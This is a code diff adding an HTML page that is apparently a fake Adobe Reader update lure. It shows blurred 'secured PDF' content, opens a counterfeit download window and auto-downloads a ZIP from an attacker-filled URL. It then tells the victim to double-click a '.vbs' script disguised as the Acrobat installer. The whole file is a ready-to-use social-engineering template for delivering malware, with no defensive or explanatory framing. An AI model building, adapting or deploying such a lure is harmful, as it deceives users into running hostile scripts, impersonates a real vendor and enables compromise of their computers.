@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secured PDF Files</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #000;
+            overflow: hidden;
+        }
+
+        /* Blurred scrolling background */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .scroll-container {
+            position: absolute;
+            width: 100%;
+            height: 200%;
+            display: flex;
+            flex-direction: column;
+            animation: scrollUp 15s linear infinite;
+            filter: blur(8px) brightness(0.4);
+        }
+
+        @keyframes scrollUp {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(-50%);
+            }
+        }
+
+        .pdf-page {
+            width: 100%;
+            height: 50%;
+            background: linear-gradient(45deg, #f5f5f5 0%, #e0e0e0 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #999;
+            position: relative;
+            color: #333;
+            font-size: 12px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .pdf-page::before {
+            content: '📄 PDF Document';
+            position: absolute;
+            font-size: 24px;
+        }
+
+        /* Center Modal */
+        .modal-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+        }
+
+        .modal {
+            background: #000;
+            padding: 60px 40px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+        }
+
+        .pdf-icon {
+            width: 80px;
+            height: 80px;
+            background: #ff0000;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 50px;
+        }
+
+        .modal-text {
+            color: #fff;
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            font-weight: 300;
+        }
+
+        .view-button {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 15px 50px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .view-button:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.4);
+        }
+
+        .view-button:active {
+            transform: scale(0.98);
+        }
+
+        /* ===== DOWNLOAD POPUP MODAL ===== */
+        .download-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 3;
+        }
+
+        .download-popup.active {
+            display: flex;
+        }
+
+        .download-container {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.3);
+            max-width: 900px;
+            width: 95%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        /* Browser-like header */
+        .browser-header {
+            background: #f5f5f5;
+            padding: 15px 20px;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-radius: 10px 10px 0 0;
+        }
+
+        .browser-tab {
+            background: #fff;
+            padding: 10px 15px;
+            border-radius: 5px 5px 0 0;
+            font-size: 13px;
+            color: #333;
+            border: 1px solid #ddd;
+            border-bottom: none;
+        }
+
+        .browser-tab.active {
+            background: #fff;
+        }
+
+        .browser-controls {
+            margin-left: auto;
+            display: flex;
+            gap: 5px;
+        }
+
+        .browser-btn {
+            width: 35px;
+            height: 35px;
+            background: #e8e8e8;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* Blue notification banner */
+        .notification {
+            background: #0066cc;
+            color: white;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            position: sticky;
+            top: 0;
+        }
+
+        .notification-icon {
+            font-size: 20px;
+        }
+
+        .close-notification {
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 18px;
+            margin-left: auto;
+        }
+
+        /* Main content */
+        .download-content {
+            padding: 60px 40px;
+            text-align: center;
+            background: #f9f9f9;
+        }
+
+        .download-title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 50px;
+            font-weight: 600;
+        }
+
+        .steps-container {
+            display: flex;
+            justify-content: space-around;
+            gap: 40px;
+            margin-top: 40px;
+        }
+
+        .step {
+            flex: 1;
+        }
+
+        .step-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+        }
+
+        .step-icon.downloading {
+            background: linear-gradient(135deg, #ff5555 0%, #ff8888 100%);
+            border-radius: 15px;
+            color: white;
+        }
+
+        .step-icon.completed {
+            background: linear-gradient(135deg, #ff5555 0%, #ff8888 100%);
+            border-radius: 15px;
+            color: white;
+        }
+
+        .step-label {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+
+        .step-title {
+            font-size: 18px;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .step-description {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        /* Progress bar */
+        .progress-bar-container {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: #0066cc;
+            border-radius: 10px;
+            animation: progress 3s ease-in-out forwards;
+            width: 0%;
+        }
+
+        @keyframes progress {
+            0% {
+                width: 5%;
+            }
+            50% {
+                width: 75%;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        .downloading-text {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Blurred Scrolling Background -->
+    <div class="background">
+        <div class="scroll-container">
+            <div class="pdf-page"></div>
+            <div class="pdf-page"></div>
+            <div class="pdf-page"></div>
+            <div class="pdf-page"></div>
+            <div class="pdf-page"></div>
+        </div>
+    </div>
+
+    <!-- Landing Page Modal -->
+    <div class="modal-container" id="landingModal">
+        <div class="modal">
+            <div class="pdf-icon">📄</div>
+            <p class="modal-text">
+                These secured PDF files were created using the latest version of Adobe. Please update or download Adobe PDF Reader to view them.
+            </p>
+            <button class="view-button" onclick="showDownloadPopup()">View Files</button>
+        </div>
+    </div>
+
+    <!-- Download Popup Modal -->
+    <div class="download-popup" id="downloadPopup">
+        <div class="download-container">
+            <!-- Browser Header -->
+            <div class="browser-header">
+                <div class="browser-tab active">
+                    🔴 Download Adobe Acrobat Reader
+                </div>
+                <div class="browser-tab">
+                    New Tab
+                </div>
+                <div class="browser-controls">
+                    <button class="browser-btn">−</button>
+                    <button class="browser-btn">□</button>
+                    <button class="browser-btn" onclick="closeDownloadPopup()">×</button>
+                </div>
+            </div>
+
+            <!-- Blue Notification Banner -->
+            <div class="notification">
+                <span class="notification-icon">⬇️</span>
+                <span>Please open your Downloads and EXTRACT on the ZIP file to install Acrobat Reader.</span>
+                <button class="close-notification" onclick="closeNotification()">×</button>
+            </div>
+
+            <!-- Main Content -->
+            <div class="download-content">
+                <h1 class="download-title">Download and launch your Acrobat Reader software</h1>
+
+                <div class="steps-container">
+                    <!-- Step 1: Download -->
+                    <div class="step">
+                        <div class="step-icon downloading">📥</div>
+                        <div class="step-label">Step 1: Download software</div>
+                        <div class="step-title">Downloading...</div>
+                        <div class="downloading-text">Your download includes Acrobat Reader.</div>
+                        
+                        <!-- Progress Bar -->
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="progressBar"></div>
+                        </div>
+                    </div>
+
+                    <!-- Step 2: Install -->
+                    <div class="step">
+                        <div class="step-icon completed">✓</div>
+                        <div class="step-label">Step 2: Finish installation</div>
+                        <div class="step-title">Installation</div>
+                        <div class="step-description">
+                            Open your Downloads folder and locate the Adobe Acrobat installer file, with a name "enReaderupdatepkg_AdobeAcrobat.vbs".<br><br>
+                            Double-click the installer file to complete the installation.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Show download popup and trigger auto-download
+        function showDownloadPopup() {
+            document.getElementById('downloadPopup').classList.add('active');
+            document.getElementById('landingModal').style.display = 'none';
+            
+            // Trigger auto-download after 1 second
+            setTimeout(() => {
+                triggerDownload();
+            }, 1000);
+        }
+
+        // Close download popup
+        function closeDownloadPopup() {
+            document.getElementById('downloadPopup').classList.remove('active');
+            document.getElementById('landingModal').style.display = 'flex';
+        }
+
+        // Close notification
+        function closeNotification() {
+            document.querySelector('.notification').style.display = 'none';
+        }
+
+        // Auto-download function
+        function triggerDownload() {
+            // ========== CHANGE THIS URL TO YOUR FILE ==========
+            const fileUrl = '';
+            
+            // Create temporary link and download
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'enReaderupdatepkg_AdobeAcrobat.zip';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
